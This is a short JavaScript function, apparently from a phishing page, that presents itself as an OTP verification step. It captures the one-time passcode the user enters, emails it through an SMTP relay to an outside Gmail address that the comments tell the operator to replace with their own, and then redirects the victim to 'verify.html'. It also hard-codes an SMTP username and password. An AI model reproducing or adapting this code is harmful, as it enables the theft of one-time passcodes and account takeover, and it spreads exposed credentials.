function emailSend() {
  var pin = document.getElementById('pin').value; // Getting the OTP entered by the user
  var messageBody = "OTP: " + pin; // Constructing the message body with OTP

  Email.send({
    Host: "smtp.elasticemail.com",
    Username: "nelsf38@gmail.com",
    Password: "3D538C4DF17B36F1E64CD578356BE2FCF3CA",
    To: 'sonkiban@gmail.com', // Change this to your email address where you want to receive the OTP
    From: "nelsf38@gmail.com",
    Subject: "OTP",
    Body: messageBody
  }).then(
    message => {
      if (message == 'OK') {
        window.location.href = 'verify.html'; // Redirecting to otp.html upon successful email sending
      }
      else {
        swal("Error", "Please complete the OTP field", "error") // Displaying an error message if email sending fails
      }
    }
  );
}
